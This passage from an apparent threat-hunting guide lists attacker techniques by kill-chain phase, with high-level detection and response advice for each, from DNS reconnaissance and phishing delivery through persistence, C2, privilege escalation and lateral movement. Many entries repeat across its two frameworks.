infrastructure. Detection: Monitor DNS query logs for patterns indicative of reconnaissance activities. Response: Implement DNS security measures such as DNSSEC, and regularly audit DNS records for unnecessary exposure. 2. Weaponization \u0026amp; Delivery # Detecting File Creation: Technique: Delivery of malware via document downloads or email attachments. Detection: Implement file integrity monitoring to detect the creation of new files, especially executable or script types, and scan them with antivirus software. Response: Quarantine suspicious files immediately, alert relevant teams, and conduct a thorough scan of the affected system. Detecting Malicious Email Attachments: Technique: Embedding malicious code in email attachments. Detection: Use email security gateways and sandboxing to analyze attachments for malicious behavior. Response: Block emails with malicious attachments, educate users on the dangers of opening unknown attachments, and update email filtering rules. Detecting Malicious Links: Technique: Sending links to malicious websites that host exploit kits or malware. Detection: Implement URL filtering and threat intelligence to block known malicious domains. Response: Train users to recognize and avoid clicking on suspicious links, and use browser isolation techniques. Detecting Exploit Kits: Technique: Use of exploit kits to deliver malware through vulnerabilities in web browsers or plugins. Detection: Monitor for indicators of exploit kit activity, such as unusual web traffic patterns or known exploit kit signatures. Response: Patch vulnerable software promptly, use virtual patching for web applications, and employ intrusion prevention systems (IPS). Spear-Phishing Attachments: Technique: Crafting tailored emails with malicious attachments targeting specific individuals. Detection: Use advanced email security solutions to scan attachments for malicious content and employ sandboxing techniques. Response: Train employees to recognize and report suspicious emails, and configure email filters to block malicious attachments. Drive-By Downloads: Technique: Compromising websites to deliver malware when a user visits the site. Detection: Implement web filtering solutions to block access to known malicious websites and use browser security settings to prevent automatic downloads. Response: Regularly update web browsers and plugins to patch vulnerabilities, and educate users on the risks of visiting untrusted websites. 3. Exploitation # Detecting Mimikatz: Technique: Extracting plaintext passwords, hash values, and Kerberos tickets from memory. Detection: Monitor access to the LSASS process and detect typical Mimikatz command patterns or memory access behaviors. Response: Implement endpoint protection solutions, restrict access to sensitive processes, and immediately isolate affected systems for forensic analysis. Hunting Abnormal LSASS Behavior and Detecting LSASS Behavior with PowerShell: Technique: Unusual interaction with the LSASS process indicating credential dumping attempts. Detection: Implement rules in SIEM systems to alert on atypical accesses to LSASS, and use PowerShell scripts to check LSASS process integrity and behavior. Response: Investigate and remediate abnormal behavior, update security policies to restrict LSASS access, and educate users on secure password handling. Detecting Exploits Against Web Applications: Technique: Exploiting vulnerabilities in web applications to gain unauthorized access or execute malicious code. Detection: Use web application firewalls (WAFs) to detect and block malicious requests, and monitor application logs for signs of exploitation. Response: Regularly update and patch web applications, conduct security assessments, and implement secure coding practices. Detecting Brute Force Attacks: Technique: Repeatedly trying different passwords to gain unauthorized access. Detection: Monitor for excessive login attempts and failed authentication requests. Response: Implement account lockout policies, use MFA, and analyze login patterns to identify and block brute force attempts. Exploitation of User Credentials: Technique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts, particularly from unfamiliar locations or devices. Response: Enforce strong password policies, implement multi-factor authentication (MFA), and reset compromised credentials immediately. 4. Installation # Hunting Malware: Technique: Installation of executables, DLLs, or scripts to maintain attacker presence. Detection: Regular scans with updated antivirus definitions, anomaly detection for new processes or service installations, and behavioral analysis for known malware tactics. Response: Quarantine detected malware, conduct a root cause analysis to understand how it was installed, and enhance defenses to prevent recurrence. Hunting RATS and C2 Servers: Technique: RATs establish persistence and facilitate remote access. Detection: Monitor outbound connections for traffic to known C2 infrastructure, unusual periodic traffic patterns, or unrecognized encryption protocols. Response: Block known C2 IP addresses and domains, isolate affected systems, and perform a full security audit to identify and close entry points. Hunting for Common Back Connect Ports with PowerShell: Technique: Specific network ports used by malware for outbound connections. Detection: Use PowerShell to scan for and log connections on suspicious ports, with real-time alerts for unexpected activity. Response: Block unauthorized ports, review firewall rules, and implement network segmentation to limit lateral movement. Detecting Malicious Scheduled Tasks: Technique: Using scheduled tasks to execute malicious code at specific times. Detection: Monitor for the creation of new scheduled tasks and changes to existing tasks. Response: Review and delete unauthorized scheduled tasks, and audit task creation policies. Detecting Startup Persistence Mechanisms: Technique: Modifying startup settings to ensure malware runs when the system starts. Detection: Monitor startup folders, registry keys, and system services for changes. Response: Remove unauthorized startup entries, reinforce access controls, and educate users on avoiding actions that enable persistence. Fileless Malware: Technique: Using legitimate system tools to execute malicious activities without writing files to disk. Detection: Monitor system behavior for anomalies, such as unusual use of PowerShell or WMI. Response: Implement application whitelisting and restrict the use of system tools to authorized personnel. Malicious Browser Extensions: Technique: Installing browser extensions that perform malicious actions. Detection: Monitor for the installation of unauthorized browser extensions and unusual browser activity. Response: Educate users on the risks of installing untrusted extensions, and implement browser security policies to control extension installations. 5. Command and Control (C2) # Persistence: Hunting Startup Persistence: Technique: Techniques involving registry keys, startup folder items, scheduled tasks, or services to reload malware after restarts. Detection: Monitor and audit startup directories, task scheduler, service list, and registry startup keys for unexpected entries. Response: Remove unauthorized startup entries, reinforce access controls, and educate users on avoiding actions that enable persistence. Hunting Registry Key Persistence: Technique: Using the registry to maintain persistence or configure software in a way that benefits the attacker. Detection: Regularly audit registry keys commonly used for persistence and use tools to detect hidden or obfuscated keys. Response: Remove malicious registry keys, update policies to prevent unauthorized changes, and monitor registry activities for suspicious behavior. Hunting for Command and Control (C2) Traffic: Technique: Establishing communication channels with compromised systems. Detection: Monitor network traffic for known C2 patterns, beaconing behavior, and traffic to suspicious domains. Response: Block identified C2 traffic, isolate compromised systems, and conduct a thorough investigation to identify and remove malware. Detecting DNS Tunneling: Technique: Using DNS queries to exfiltrate data or establish C2 channels. Detection: Analyze DNS traffic for unusual query patterns and payload sizes. Response: Implement DNS filtering and response policies, and block or sinkhole malicious domains. Domain Generation Algorithms (DGAs): Technique: Using algorithms to generate a large number of domain names for C2 communication. Detection: Monitor DNS traffic for patterns indicative of DGAs and use threat intelligence feeds to identify known malicious domains. Response: Block identified domains at the firewall, and implement DNS filtering solutions to prevent communication with DGA-generated domains. Beaconing: Technique: Regularly sending signals to a C2 server to check for instructions. Detection: Use network monitoring tools to identify beaconing patterns, such as regular, periodic outbound connections. Response: Investigate and block the source of beaconing traffic, and update firewall rules to prevent future connections. 6. Actions on Objectives # Data Exfiltration: Technique: Stealing sensitive data from compromised systems. Detection: Monitor for large, unusual data transfers and use Data Loss Prevention (DLP) solutions to detect and block unauthorized data movements. Analyze outbound traffic for abnormal patterns. Response: Identify and isolate the source of exfiltration, mitigate the leak, review and enhance data access policies, and conduct a post-incident analysis to understand the breach and prevent recurrence. Detecting Evasion Techniques: Hunting Alternate Data Streams (ADS): Technique: Hiding files/data from normal file browsing tools. Detection: Scan file systems for hidden streams and monitor file system API calls for signs of ADS creation. Response: Remove hidden streams, reinforce file system monitoring, and educate users on secure file handling practices. Detecting Remote Threads: Technique: Injecting code into other processes via remote threads. Detection: Monitor for unexpected thread creation, especially from external processes into critical system processes. Response: Terminate malicious threads, isolate affected processes, and perform a security review to prevent future injection attempts. Detecting Evasion Techniques with PowerShell: Technique: Using PowerShell to execute code directly in memory, modify system logs, or alter security settings. Detection: Log and monitor PowerShell execution policies, command line inputs, and scripts run, focusing on encoded or obfuscated commands. Response: Restrict PowerShell usage, implement logging and monitoring for all PowerShell activities, and update security policies to mitigate risks. Privilege Escalation: Technique: Gaining elevated access to perform unauthorized actions. Detection: Monitor for abnormal behavior such as the creation of new admin accounts or changes to existing accounts. Use behavioral analytics to detect deviations from normal user activity. Response: Immediately remove elevated access, investigate the source of the escalation, and apply security patches to prevent the exploit from being reused. Impact and Sabotage: Technique: Disrupting services, deleting data, or otherwise causing harm to the organization. Detection: Monitor system logs for unusual deletion activities, service disruptions, or unauthorized configuration changes. Response: Isolate affected systems, restore from backups, conduct a thorough incident review, and enhance monitoring and protection mechanisms to prevent recurrence. Based on Unified Kill Chain # 1. Reconnaissance # Hunting for Open Ports using PowerShell:\nTechnique: Attackers scan for open ports to discover services they can exploit. Detection: Develop scripts to log and analyze port scanning activities and alert on anomalies compared to baseline port usage. Response: Block or limit access to unused ports, implement network segmentation, and regularly audit network services. Hunting Network Connections:\nTechnique: Monitoring connections to reveal attempts to reach known bad domains or unusual external systems. Detection: Use network traffic analysis tools to flag new, unexpected, or unauthorized connections. Response: Block connections to known malicious IPs and domains, and implement network whitelisting. Hunting Metasploit:\nTechnique: Using Metasploit for initial scanning and probing. Detection: Detect signatures of Metasploit payloads and modules in network traffic, and monitor for suspicious endpoint behavior. Response: Isolate and investigate systems showing signs of Metasploit activity, and update defenses to mitigate known Metasploit exploits. Hunting for Common Enumeration Techniques:\nTechnique: Attackers use tools like Nmap and Nessus to enumerate network services and vulnerabilities. Detection: Monitor for high volumes of network traffic and unusual patterns indicative of enumeration tools. Response: Conduct regular internal vulnerability assessments to understand the attack surface and apply necessary patches. Hunting DNS Requests:\nTechnique: Attackers use DNS requests to resolve command and control servers or gather information about the network. Detection: Analyze DNS query logs for unusual domain lookups and patterns that deviate from normal behavior. Response: Block suspicious domains, implement DNS filtering solutions, and configure alerting for high-risk domain queries. Hunting Social Media and Public Data Leaks:\nTechnique: Attackers gather information from social media profiles and public data sources. Detection: Monitor social media and public forums for mentions of your organization, and use digital risk protection services. Response: Educate employees on safe social media practices, and take down exposed sensitive information from public sites. OSINT Gathering:\nTechnique: Collecting information from publicly available sources about the target organization. Detection: Monitor social media, public forums, and other platforms for mentions of the organization or key personnel. Response: Educate employees about the risks of oversharing information and implement policies to minimize exposure. DNS Reconnaissance:\nTechnique: Querying DNS records to gather information about the target’s infrastructure. Detection: Monitor DNS query logs for patterns indicative of reconnaissance activities. Response: Implement DNS security measures such as DNSSEC, and regularly audit DNS records for unnecessary exposure. 2. Resource Development # Hunting for Credential Dumping Tools:\nTechnique: Using tools like Mimikatz to extract passwords and hashes from memory. Detection: Monitor for execution of known credential dumping tools and abnormal access to sensitive processes like LSASS. Response: Implement endpoint protection solutions, restrict access to sensitive processes, and isolate affected systems for forensic analysis. Detecting Malware Compilers:\nTechnique: Development and compilation of custom malware. Detection: Monitor for the use of common compilers and development environments used to create malware. Response: Isolate development environments from production networks and monitor for suspicious compilations. Detecting Malicious Email Campaigns:\nTechnique: Crafting and distributing phishing emails to gather credentials or deliver malware. Detection: Use email security solutions to detect and block phishing attempts and monitor for unusual email patterns. Response: Educate users on phishing threats and implement email filtering rules. Detecting Rogue Infrastructure:\nTechnique: Setting up command and control servers and other malicious infrastructure. Detection: Use threat intelligence to identify and monitor rogue domains and IP addresses. Response: Block access to known malicious infrastructure and monitor for attempts to connect to suspicious domains. Hunting Malicious Code Repositories:\nTechnique: Storing and sharing malicious code through public or private repositories. Detection: Monitor for access to known malicious repositories and inspect repositories for suspicious code. Response: Block access to malicious repositories and implement code review policies. Hunting Compromised Accounts:\nTechnique: Using compromised accounts to gain further access or distribute malware. Detection: Monitor for unusual login attempts and access patterns. Response: Reset compromised credentials and implement multi-factor authentication. Hunting for Exploit Kits:\nTechnique: Developing or purchasing exploit kits to deliver malware. Detection: Monitor for traffic indicative of exploit kit use and analyze suspicious files. Response: Patch vulnerable software and block known exploit kit domains. 3. Delivery # Detecting Malicious Email Attachments:\nTechnique: Embedding malicious code in email attachments. Detection: Use email security gateways and sandboxing to analyze attachments for malicious behavior. Response: Block emails with malicious attachments and educate users on the dangers of opening unknown attachments. Detecting Malicious Links:\nTechnique: Sending links to malicious websites that host exploit kits or malware. Detection: Implement URL filtering and threat intelligence to block known malicious domains. Response: Train users to recognize and avoid clicking on suspicious links and use browser isolation techniques. Drive-By Downloads:\nTechnique: Compromising websites to deliver malware when a user visits the site. Detection: Implement web filtering solutions to block access to known malicious websites and use browser security settings to prevent automatic downloads. Response: Regularly update web browsers and plugins to patch vulnerabilities and educate users on the risks of visiting untrusted websites. Watering Hole Attacks:\nTechnique: Compromising a site likely to be visited by the target to deliver malware. Detection: Monitor for unusual activity on commonly visited sites and use threat intelligence to identify compromised sites. Response: Block access to compromised sites and educate users on safe browsing practices. USB-Based Malware:\nTechnique: Using infected USB drives to deliver malware. Detection: Monitor for new USB device connections and scan for malware. Response: Educate users on the risks of using untrusted USB devices and implement USB usage policies. Malvertising:\nTechnique: Using malicious advertisements to deliver malware. Detection: Use ad blockers and monitor for unusual web activity. Response: Block access to known malvertising networks and educate users on the risks of clicking on ads. Supply Chain Attacks:\nTechnique: Compromising a third-party supplier to deliver malware. Detection: Monitor for unusual activity from third-party software and services. Response: Conduct security assessments of suppliers and implement monitoring for third-party services. Spear-Phishing Attachments:\nTechnique: Crafting tailored emails with malicious attachments targeting specific individuals. Detection: Use advanced email security solutions to scan attachments for malicious content and employ sandboxing techniques. Response: Train employees to recognize and report suspicious emails and configure email filters to block malicious attachments. 4. Social Engineering # Pretexting:\nTechnique: Creating a fabricated scenario to obtain information or access. Detection: Educate employees on social engineering tactics and monitor for unusual requests for sensitive information. Response: Implement verification processes for sensitive requests and conduct regular social engineering awareness training. Baiting:\nTechnique: Offering something enticing to lure victims into a trap. Detection: Monitor for suspicious offers or emails and educate users on the risks of accepting unknown offers. Response: Block known baiting attempts and reinforce policies against engaging with unknown offers. Quid Pro Quo:\nTechnique: Offering a service or benefit in exchange for information. Detection: Monitor for unusual requests for information and educate users on the risks of exchanging information for services. Response: Implement strict information sharing policies and verify all requests for information. Tailgating:\nTechnique: Following someone into a secure area without proper authorization. Detection: Use physical security measures like badge access and educate employees on the importance of not allowing tailgating. Response: Implement policies for reporting tailgating incidents and reinforce physical security measures. Vishing:\nTechnique: Using phone calls to deceive individuals into revealing information. Detection: Monitor for unusual phone activity and educate users on the risks of sharing information over the phone. Response: Implement verification processes for sensitive information shared over the phone and conduct regular awareness training. Smishing:\nTechnique: Using SMS messages to deceive individuals into revealing information. Detection: Monitor for suspicious SMS messages and educate users on the risks of sharing information via SMS. - Response: Block known malicious SMS senders and reinforce policies against sharing sensitive information via SMS.\nShoulder Surfing:\nTechnique: Observing someone’s screen to gather information. Detection: Educate employees on the risks of shoulder surfing and monitor for unusual behavior in workspaces. Response: Implement privacy screens and conduct awareness training on securing screens in public areas. Impersonation:\nTechnique: Pretending to be someone else to gain access or information. Detection: Educate employees on impersonation tactics and monitor for unusual requests for access or information. Response: Implement verification processes for identity and conduct regular awareness training. 5. Exploitation # Exploiting Vulnerabilities in Web Applications:\nTechnique: Using known vulnerabilities to gain unauthorized access or execute malicious code. Detection: Use web application firewalls (WAFs) to detect and block malicious requests and monitor application logs for signs of exploitation. Response: Regularly update and patch web applications, conduct security assessments, and implement secure coding practices. Exploiting Software Vulnerabilities:\nTechnique: Using vulnerabilities in software to gain access or escalate privileges. Detection: Monitor for signs of exploitation and use intrusion detection systems (IDS) to detect suspicious activity. Response: Patch software promptly and use virtual patching to mitigate vulnerabilities. Exploiting Configuration Weaknesses:\nTechnique: Taking advantage of weak or misconfigured settings to gain access. Detection: Conduct regular security assessments and monitor for configuration changes. Response: Implement secure configuration policies and regularly audit configurations. Exploiting Insecure APIs:\nTechnique: Using vulnerabilities in APIs to gain unauthorized access. Detection: Monitor API traffic for signs of exploitation and use API gateways to enforce security policies. Response: Secure APIs with authentication and authorization controls and regularly test for vulnerabilities. Exploiting Buffer Overflows:\nTechnique: Using buffer overflow vulnerabilities to execute arbitrary code. Detection: Monitor for signs of buffer overflow attacks and use security solutions to detect and block them. Response: Apply patches and updates to vulnerable software and use security coding practices to prevent buffer overflows. Exploiting Weak Authentication:\nTechnique: Using weak or compromised authentication mechanisms to gain access. Detection: Monitor for unusual login attempts and use multi-factor authentication (MFA). Response: Implement strong authentication policies and regularly review and update them. Exploiting Privilege Escalation Vulnerabilities:\nTechnique: Using vulnerabilities to gain elevated privileges. Detection: Monitor for signs of privilege escalation and use security solutions to detect and block them. Response: Apply patches and updates to vulnerable software and use security best practices to prevent privilege escalation. Exploiting Credential Reuse:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts and use MFA. Response: Implement strong password policies and educate users on the risks of credential reuse. 6. Persistence # Hunting Malware:\nTechnique: Installation of executables, DLLs, or scripts to maintain attacker presence. Detection: Regular scans with updated antivirus definitions, anomaly detection for new processes or service installations, and behavioral analysis for known malware tactics. Response: Quarantine detected malware, conduct a root cause analysis to understand how it was installed, and enhance defenses to prevent recurrence. Hunting RATS and C2 Servers:\nTechnique: RATs establish persistence and facilitate remote access. Detection: Monitor outbound connections for traffic to known C2 infrastructure, unusual periodic traffic patterns, or unrecognized encryption protocols. Response: Block known C2 IP addresses and domains, isolate affected systems, and perform a full security audit to identify and close entry points. Hunting for Common Back Connect Ports with PowerShell:\nTechnique: Specific network ports used by malware for outbound connections. Detection: Use PowerShell to scan for and log connections on suspicious ports, with real-time alerts for unexpected activity. Response: Block unauthorized ports, review firewall rules, and implement network segmentation to limit lateral movement. Detecting Malicious Scheduled Tasks:\nTechnique: Using scheduled tasks to execute malicious code at specific times. Detection: Monitor for the creation of new scheduled tasks and changes to existing tasks. Response: Review and delete unauthorized scheduled tasks, and audit task creation policies. Detecting Startup Persistence Mechanisms:\nTechnique: Modifying startup settings to ensure malware runs when the system starts. Detection: Monitor startup folders, registry keys, and system services for changes. Response: Remove unauthorized startup entries, reinforce access controls, and educate users on avoiding actions that enable persistence. Fileless Malware:\nTechnique: Using legitimate system tools to execute malicious activities without writing files to disk. Detection: Monitor system behavior for anomalies, such as unusual use of PowerShell or WMI. Response: Implement application whitelisting and restrict the use of system tools to authorized personnel. Malicious Browser Extensions:\nTechnique: Installing browser extensions that perform malicious actions. Detection: Monitor for the installation of unauthorized browser extensions and unusual browser activity. Response: Educate users on the risks of installing untrusted extensions, and implement browser security policies to control extension installations. Hunting Registry Key Persistence:\nTechnique: Using the registry to maintain persistence or configure software in a way that benefits the attacker. Detection: Regularly audit registry keys commonly used for persistence and use tools to detect hidden or obfuscated keys. Response: Remove malicious registry keys, update policies to prevent unauthorized changes, and monitor registry activities for suspicious behavior. 7. Defense Evasion # Hunting Alternate Data Streams (ADS):\nTechnique: Hiding files/data from normal file browsing tools. Detection: Scan file systems for hidden streams and monitor file system API calls for signs of ADS creation. Response: Remove hidden streams, reinforce file system monitoring, and educate users on secure file handling practices. Detecting Remote Threads:\nTechnique: Injecting code into other processes via remote threads. Detection: Monitor for unexpected thread creation, especially from external processes into critical system processes. Response: Terminate malicious threads, isolate affected processes, and perform a security review to prevent future injection attempts. Detecting Evasion Techniques with PowerShell:\nTechnique: Using PowerShell to execute code directly in memory, modify system logs, or alter security settings. Detection: Log and monitor PowerShell execution policies, command line inputs, and scripts run, focusing on encoded or obfuscated commands. Response: Restrict PowerShell usage, implement logging and monitoring for all PowerShell activities, and update security policies to mitigate risks. Detecting Obfuscated Files or Information:\nTechnique: Using obfuscation techniques to hide malicious code or data. Detection: Use static and dynamic analysis tools to detect obfuscation techniques in files and scripts. Response: Deobfuscate and analyze suspicious files, and update detection rules to recognize new obfuscation methods. Detecting Process Injection:\nTechnique: Injecting malicious code into legitimate processes. Detection: Monitor for abnormal memory modifications and the creation of new threads in existing processes. Response: Investigate and terminate malicious processes, and update security measures to prevent future injections. Hunting for Rootkits:\nTechnique: Using rootkits to hide malicious activities and maintain persistence. Detection: Use rootkit detection tools and monitor for signs of rootkit activity, such as hidden files and processes. Response: Remove detected rootkits, conduct a full system scan, and update security policies to prevent rootkit installations. Detecting Anti-Forensics Techniques:\nTechnique: Using techniques to prevent or hinder forensic analysis. Detection: Monitor for the use of anti-forensics tools and techniques, such as data wiping and encryption. Response: Investigate and counteract anti-forensics measures, and update policies to detect and prevent their use. Detecting Log Manipulation:\nTechnique: Altering or deleting logs to cover tracks. Detection: Monitor for unusual log activity and implement tamper-evident logging solutions. Response: Investigate and restore altered or deleted logs, and reinforce logging policies to ensure integrity. 8. Command \u0026amp; Control (C2) # Hunting for Command and Control (C2) Traffic: Technique: Establishing communication channels with compromised systems. Detection: Monitor network traffic for known C 2 patterns, beaconing behavior, and traffic to suspicious domains. - Response: Block identified C2 traffic, isolate compromised systems, and conduct a thorough investigation to identify and remove malware.\nDetecting DNS Tunneling:\nTechnique: Using DNS queries to exfiltrate data or establish C2 channels. Detection: Analyze DNS traffic for unusual query patterns and payload sizes. Response: Implement DNS filtering and response policies, and block or sinkhole malicious domains. Domain Generation Algorithms (DGAs):\nTechnique: Using algorithms to generate a large number of domain names for C2 communication. Detection: Monitor DNS traffic for patterns indicative of DGAs and use threat intelligence feeds to identify known malicious domains. Response: Block identified domains at the firewall, and implement DNS filtering solutions to prevent communication with DGA-generated domains. Beaconing:\nTechnique: Regularly sending signals to a C2 server to check for instructions. Detection: Use network monitoring tools to identify beaconing patterns, such as regular, periodic outbound connections. Response: Investigate and block the source of beaconing traffic, and update firewall rules to prevent future connections. Detecting C2 Over HTTPS:\nTechnique: Using HTTPS to encrypt C2 traffic and evade detection. Detection: Monitor for unusual HTTPS traffic patterns and use SSL inspection to analyze encrypted traffic. Response: Block identified malicious HTTPS traffic and implement SSL inspection policies. Detecting C2 Over Social Media:\nTechnique: Using social media platforms to communicate with C2 servers. Detection: Monitor for unusual social media activity and use threat intelligence to identify malicious accounts. Response: Block access to known malicious social media accounts and reinforce social media usage policies. Detecting C2 Over P2P Networks:\nTechnique: Using peer-to-peer networks for C2 communication. Detection: Monitor for unusual P2P traffic patterns and use threat intelligence to identify malicious P2P nodes. Response: Block identified malicious P2P traffic and implement P2P usage policies. Detecting C2 Over Custom Protocols:\nTechnique: Using custom protocols to evade detection. Detection: Monitor for unusual traffic patterns and use deep packet inspection (DPI) to analyze traffic. Response: Block identified malicious custom protocol traffic and update firewall rules to prevent future connections. 9. Pivoting # Detecting Lateral Movement:\nTechnique: Moving laterally within the network to gain access to additional systems. Detection: Monitor for unusual login attempts and access patterns, and use endpoint detection and response (EDR) solutions. Response: Isolate affected systems, reset credentials, and conduct a full security audit. Detecting Pass-the-Hash Attacks:\nTechnique: Using stolen hash values to authenticate without knowing the actual password. Detection: Monitor for unusual authentication attempts and use multi-factor authentication (MFA). Response: Reset compromised credentials and implement strong password policies. Detecting Pass-the-Ticket Attacks:\nTechnique: Using stolen Kerberos tickets to authenticate. Detection: Monitor for unusual Kerberos ticket activity and use MFA. Response: Reset compromised credentials and implement strong authentication policies. Detecting Remote Desktop Protocol (RDP) Usage:\nTechnique: Using RDP to move laterally within the network. Detection: Monitor for unusual RDP activity and use endpoint security solutions. Response: Restrict RDP usage and implement network segmentation. Detecting SMB Relay Attacks:\nTechnique: Using the Server Message Block (SMB) protocol to relay authentication requests. Detection: Monitor for unusual SMB activity and use network security solutions. Response: Block identified malicious SMB traffic and implement network segmentation. Detecting Remote File Copy:\nTechnique: Copying files remotely to facilitate lateral movement. Detection: Monitor for unusual file copy activity and use data loss prevention (DLP) solutions. Response: Block identified malicious file copy attempts and implement network segmentation. Detecting Windows Management Instrumentation (WMI) Usage:\nTechnique: Using WMI to execute commands on remote systems. Detection: Monitor for unusual WMI activity and use endpoint security solutions. Response: Restrict WMI usage and implement network segmentation. Detecting PowerShell Remoting:\nTechnique: Using PowerShell to execute commands on remote systems. Detection: Monitor for unusual PowerShell remoting activity and use endpoint security solutions. Response: Restrict PowerShell remoting usage and implement network segmentation. 10. Discovery # Detecting Network Scanning:\nTechnique: Scanning the network to discover devices and services. Detection: Monitor for unusual network scanning activity and use intrusion detection systems (IDS). Response: Block identified malicious scanning attempts and implement network segmentation. Detecting Account Enumeration:\nTechnique: Enumerating user accounts to identify targets. Detection: Monitor for unusual account enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong authentication policies. Detecting Group Policy Enumeration:\nTechnique: Enumerating group policies to understand security settings. Detection: Monitor for unusual group policy enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong security policies. Detecting File Share Enumeration:\nTechnique: Enumerating file shares to identify potential targets. Detection: Monitor for unusual file share enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong access controls. Detecting Software Inventory:\nTechnique: Enumerating installed software to identify vulnerabilities. Detection: Monitor for unusual software inventory activity and use endpoint security solutions. Response: Block identified malicious inventory attempts and implement strong security policies. Detecting System Information Discovery:\nTechnique: Gathering information about the system to identify targets. Detection: Monitor for unusual system information discovery activity and use endpoint security solutions. Response: Block identified malicious discovery attempts and implement strong security policies. Detecting Network Topology Discovery:\nTechnique: Mapping the network topology to identify targets. Detection: Monitor for unusual network topology discovery activity and use network security solutions. Response: Block identified malicious discovery attempts and implement network segmentation. Detecting Active Directory Enumeration:\nTechnique: Enumerating Active Directory to identify targets. Detection: Monitor for unusual Active Directory enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong security policies. 11. Privilege Escalation # Detecting Mimikatz:\nTechnique: Extracting plaintext passwords, hash values, and Kerberos tickets from memory. Detection: Monitor access to the LSASS process and detect typical Mimikatz command patterns or memory access behaviors. Response: Implement endpoint protection solutions, restrict access to sensitive processes, and immediately isolate affected systems for forensic analysis. Hunting Abnormal LSASS Behavior and Detecting LSASS Behavior with PowerShell:\nTechnique: Unusual interaction with the LSASS process indicating credential dumping attempts. Detection: Implement rules in SIEM systems to alert on atypical accesses to LSASS, and use PowerShell scripts to check LSASS process integrity and behavior. Response: Investigate and remediate abnormal behavior, update security policies to restrict LSASS access, and educate users on secure password handling. Detecting Exploits Against Web Applications:\nTechnique: Exploiting vulnerabilities in web applications to gain unauthorized access or execute malicious code. Detection: Use web application firewalls (WAFs) to detect and block malicious requests, and monitor application logs for signs of exploitation. Response: Regularly update and patch web applications, conduct security assessments, and implement secure coding practices. Detecting Brute Force Attacks:\nTechnique: Repeatedly trying different passwords to gain unauthorized access. Detection: Monitor for excessive login attempts and failed authentication requests. Response: Implement account lockout policies, use MFA, and analyze login patterns to identify and block brute force attempts. Exploitation of User Credentials:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts, particularly from unfamiliar locations or devices. Response: Enforce strong password policies, implement multi-factor authentication (MFA), and reset compromised credentials immediately. Detecting Kerberoasting:\nTechnique: Extracting Kerberos service tickets to crack offline and retrieve plaintext passwords. Detection: Monitor for unusual Kerberos ticket requests and use honeypots to detect Kerberoasting attempts. - Response: Enforce strong password policies, implement monitoring for Kerberos activity, and update security policies.\nDetecting Token Impersonation:\nTechnique: Using stolen tokens to impersonate users and gain unauthorized access. Detection: Monitor for unusual token usage and access patterns. Response: Reset compromised tokens and implement strong authentication policies. Detecting Exploits for Privilege Escalation:\nTechnique: Using known exploits to gain elevated privileges. Detection: Monitor for signs of privilege escalation exploits and use endpoint security solutions. Response: Patch vulnerable software and implement strong security policies. 12. Execution # Detecting Malicious Scripts:\nTechnique: Using scripts to execute malicious actions. Detection: Monitor for unusual script activity and use endpoint security solutions. Response: Block identified malicious scripts and implement script execution policies. Detecting Exploit Kits:\nTechnique: Using exploit kits to deliver malware through vulnerabilities in web browsers or plugins. Detection: Monitor for indicators of exploit kit activity, such as unusual web traffic patterns or known exploit kit signatures. Response: Patch vulnerable software promptly, use virtual patching for web applications, and employ intrusion prevention systems (IPS). Detecting Malicious Macros:\nTechnique: Using macros in documents to execute malicious actions. Detection: Monitor for unusual macro activity and use endpoint security solutions. Response: Block identified malicious macros and implement macro execution policies. Detecting Scheduled Tasks:\nTechnique: Using scheduled tasks to execute malicious actions at specific times. Detection: Monitor for unusual scheduled task activity and use endpoint security solutions. Response: Block identified malicious scheduled tasks and implement task scheduling policies. Detecting PowerShell Execution:\nTechnique: Using PowerShell to execute malicious actions. Detection: Monitor for unusual PowerShell activity and use endpoint security solutions. Response: Block identified malicious PowerShell scripts and implement PowerShell execution policies. Detecting Command Line Execution:\nTechnique: Using command line tools to execute malicious actions. Detection: Monitor for unusual command line activity and use endpoint security solutions. Response: Block identified malicious command line activity and implement command line execution policies. Detecting WMI Execution:\nTechnique: Using WMI to execute malicious actions. Detection: Monitor for unusual WMI activity and use endpoint security solutions. Response: Block identified malicious WMI scripts and implement WMI execution policies. Detecting Exploit Modules:\nTechnique: Using exploit modules to execute malicious actions. Detection: Monitor for unusual exploit module activity and use endpoint security solutions. Response: Block identified malicious exploit modules and implement exploit execution policies. 13. Credential Access # Detecting Credential Dumping:\nTechnique: Using tools like Mimikatz to extract passwords and hashes from memory. Detection: Monitor for unusual process activity and access to sensitive processes like LSASS. Response: Block identified credential dumping attempts and implement endpoint security solutions. Detecting Keylogging:\nTechnique: Using keyloggers to capture keystrokes and obtain credentials. Detection: Monitor for unusual process activity and use endpoint security solutions. Response: Block identified keyloggers and implement strong security policies. Detecting Credential Harvesting:\nTechnique: Using phishing or other methods to obtain credentials. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified credential harvesting attempts and implement strong authentication policies. Detecting Password Spraying:\nTechnique: Using a single password against multiple accounts to gain access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified password spraying attempts and implement strong password policies. Detecting Brute Force Attacks:\nTechnique: Repeatedly trying different passwords to gain access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified brute force attempts and implement strong authentication policies. Detecting Pass-the-Hash Attacks:\nTechnique: Using stolen hash values to authenticate without knowing the actual password. Detection: Monitor for unusual authentication attempts and use endpoint security solutions. Response: Block identified pass-the-hash attempts and implement strong authentication policies. Detecting Pass-the-Ticket Attacks:\nTechnique: Using stolen Kerberos tickets to authenticate. Detection: Monitor for unusual Kerberos ticket activity and use endpoint security solutions. Response: Block identified pass-the-ticket attempts and implement strong authentication policies. Detecting Credential Reuse:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified credential reuse attempts and implement strong authentication policies. 14. Lateral Movement # Detecting Remote Desktop Protocol (RDP) Usage:\nTechnique: Using RDP to move laterally within the network. Detection: Monitor for unusual RDP activity and use endpoint security solutions. Response: Block identified malicious RDP activity and implement strong RDP usage policies. Detecting SMB Relay Attacks:\nTechnique: Using the Server Message Block (SMB) protocol to relay authentication requests. Detection: Monitor for unusual SMB activity and use endpoint security solutions. 